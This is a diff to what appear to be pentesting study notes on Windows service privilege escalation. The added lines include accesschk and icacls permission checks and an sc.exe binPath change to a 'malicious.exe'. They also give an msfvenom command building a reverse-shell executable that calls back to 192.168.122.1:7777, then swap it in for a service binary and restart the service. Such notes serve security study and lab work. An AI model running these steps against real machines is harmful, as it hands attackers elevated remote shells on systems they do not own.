@@ -32,7 +32,41 @@ Env:$env:PATH
 
 ## File permissions
 
-##### Accesschk.exe
+
+
+# Services 
+
+## Manage Service
+```
+Get-Service
+Get-Service | Select-Object Displayname,Status,ServiceName,Can*
+sc.exe query
+sc.exe query | select-string service_name
+
+# Binary Path
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+
+sc.exe stop <SERVICE>
+sc.exe start <SERVICE>
+sc.exe qc <SERVICE>
+sc.exe delete <SERVICE>
+
+# Check permissions
+sc.exe sdshow <SERVICE> 
+
+# Change service configuration
+sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
+
+# Add New Service
+sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
+```
+
+## Weak Permissins on Service
+
+ Use the `accesschk64' program to check if we have privileges over that process.
+
+ Remember: Services are processes and processes require .exe
 
 
 | Permission            | Description                                              |
@@ -68,33 +102,34 @@ accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
-# Services 
-
-## Manage Service
+## Weak Permission on Service Binary
 ```
-Get-Service
-Get-Service | Select-Object Displayname,Status,ServiceName,Can*
-sc.exe query
-sc.exe query | select-string service_name
-
-# Binary Path
+# Get binary path
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
+# Check configuration of binary
+# (F) = Full control
+icacls.exe .\simpleService.exe
 
-sc.exe stop <SERVICE>
-sc.exe start <SERVICE>
-sc.exe qc <SERVICE>
-sc.exe delete <SERVICE>
+# If we have (F), we can override it
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
 
-# Check permissions
-sc.exe sdshow <SERVICE> 
+# Overwrite
+cp .\simpleService.exe .\simpleService.exe.bkp
+cp .\malicious.exe .\simpleService.exe
 
-# Change service configuration
-sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
-
-# Add New Service
-sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
+# Restart
+sc.exe stop SimpleService
+sc.exe start SimpleService
 ```
+
+## Unquoted Service Path
+```
+C:\Users\Quickemu\Downloads\Example Directory\Another.exe
+C:\Users\Quickemu\Downloads\Example.exe
+
+```
+
 
 ## Permissions
 
